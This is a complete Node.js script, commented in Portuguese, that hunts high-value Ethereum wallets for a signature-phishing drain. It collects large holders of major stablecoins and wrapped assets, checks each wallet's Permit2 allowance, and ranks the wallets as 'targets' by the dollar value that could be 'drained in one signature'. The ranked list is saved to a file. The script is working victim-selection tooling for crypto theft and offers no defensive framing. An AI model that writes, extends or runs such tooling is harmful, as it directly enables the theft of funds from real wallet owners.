/// Caça alvos de alto valor: pega holders dos tokens, filtra EOA, confere allowance no Permit2
/// e soma o que sai numa unica assinatura. Uso: node ops/hunt.mjs [paginas]
import { Contract, Interface, JsonRpcProvider, formatUnits, getAddress } from "ethers";
import { writeFileSync } from "node:fs";

const pages = Number(process.argv[2] || 3);
const MIN_USD = Number(process.env.MIN_USD || 10_000);
const RPC = process.env.RPC_URL || "https://ethereum-rpc.publicnode.com";
const API = "https://eth.blockscout.com/api/v2";
const MULTICALL = "0xcA11bde05977b3631167028862bE2a173976CA11";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const TOKENS = {
  USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
  USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
  DAI: { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
  WETH: { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
  WBTC: { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
};

const erc20 = new Interface([
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
]);
const mc = new Interface(["function tryAggregate(bool,(address,bytes)[]) returns ((bool,bytes)[])"]);
const provider = new JsonRpcProvider(RPC, 1, { staticNetwork: true });

const priceRes = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum,bitcoin&vs_currencies=usd");
const px = await priceRes.json();
const USD = {
  USDC: 1, USDT: 1, DAI: 1,
  WETH: px.ethereum.usd,
  WBTC: px.bitcoin.usd,
};

const holders = new Map(); // address -> { symbol, human, usd }
for (const [symbol, meta] of Object.entries(TOKENS)) {
  let params = {};
  for (let page = 0; page < pages; page++) {
    const qs = new URLSearchParams(Object.entries(params)).toString();
    const res = await fetch(`${API}/tokens/${meta.address}/holders${qs ? "?" + qs : ""}`);
    if (!res.ok) break;
    const body = await res.json();
    for (const item of body.items || []) {
      if (item.address.is_contract) continue;
      const human = Number(formatUnits(item.value, meta.decimals));
      const usd = human * USD[symbol];
      if (usd < MIN_USD / 3) continue;
      const owner = getAddress(item.address.hash);
      const cur = holders.get(owner) || { owner, usd: 0, items: [] };
      cur.usd += usd;
      cur.items.push({ symbol, human });
      holders.set(owner, cur);
    }
    if (!body.next_page_params) break;
    params = body.next_page_params;
    await new Promise((r) => setTimeout(r, 250));
  }
}
console.log(`holders EOA coletados: ${holders.size}`);

const candidates = [...holders.values()];
const found = [];

for (let i = 0; i < candidates.length; i += 80) {
  const chunk = candidates.slice(i, i + 80);
  const calls = [];
  const map = [];
  for (const c of chunk) {
    for (const it of c.items) {
      const token = TOKENS[it.symbol].address;
      calls.push({ target: token, callData: erc20.encodeFunctionData("allowance", [c.owner, PERMIT2]) });
      map.push({ owner: c.owner, symbol: it.symbol, human: it.human });
    }
  }
  try {
    const data = mc.encodeFunctionData("tryAggregate", [false, calls.map((x) => [x.target, x.callData])]);
    const ret = await provider.call({ to: MULTICALL, data });
    const [results] = mc.decodeFunctionResult("tryAggregate", ret);
    results.forEach((r, idx) => {
      if (!r[0]) return;
      const allowance = erc20.decodeFunctionResult("allowance", r[1])[0];
      const m = map[idx];
      const dec = TOKENS[m.symbol].decimals;
      const cap = Math.min(m.human, Number(formatUnits(allowance, dec)));
      if (cap > 0) found.push({ ...m, human: cap, allowance: allowance.toString() });
    });
  } catch (err) {
    console.log(`lote ${i} falhou: ${err.shortMessage || err.message}`);
  }
}

const wallets = new Map();
for (const f of found) {
  const w = wallets.get(f.owner) || { owner: f.owner, usd: 0, items: [] };
  w.usd += f.human * USD[f.symbol];
  w.items.push(f);
  wallets.set(f.owner, w);
}

const ranked = [...wallets.values()].filter((w) => w.usd >= MIN_USD).sort((a, b) => b.usd - a.usd);
writeFileSync("whales.json", JSON.stringify(ranked, null, 2));

console.log(`\n>= US$ ${MIN_USD} drenaveis numa assinatura: ${ranked.length}\n`);
console.table(
  ranked.slice(0, 20).map((w) => ({
    alvo: w.owner,
    usd: Math.round(w.usd),
    tokens: w.items.map((x) => `${x.symbol}:${x.human.toFixed(2)}`).join(" "),
  })),
);
